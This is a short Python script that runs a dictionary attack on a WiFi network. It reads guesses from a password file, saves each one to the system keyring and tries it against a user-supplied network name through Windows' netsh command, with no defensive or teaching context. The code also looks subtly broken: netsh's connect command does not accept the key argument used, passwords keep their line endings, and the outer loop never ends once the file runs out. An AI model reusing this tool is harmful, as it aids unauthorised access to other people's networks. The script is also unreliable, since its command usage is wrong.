import subprocess
import keyring
import  time
import keyboard
import sys
f = open("PASSWORD.txt", "r")
ssid = input("Enter the name of the WiFi network: ")
while True:
    try:
        for i in f:
            if keyboard.is_pressed('ctrl'):
                sys.exit()
            password = i
            print(i)
            #input("Enter the password for the network: ")
            keyring.set_password(ssid, "WiFi", password)
            result = subprocess.call(['netsh', 'wlan', 'connect', 'name='+ssid, 'keyMaterial='+password])
            if result == 0:
                print("Successfully connected to the network: ", ssid)
                time.sleep(60)
            else:
                print("Connection failed. Please check your SSID and password.")
    except Exception as e:
        print("An error occurred while connecting to the network: ", e)

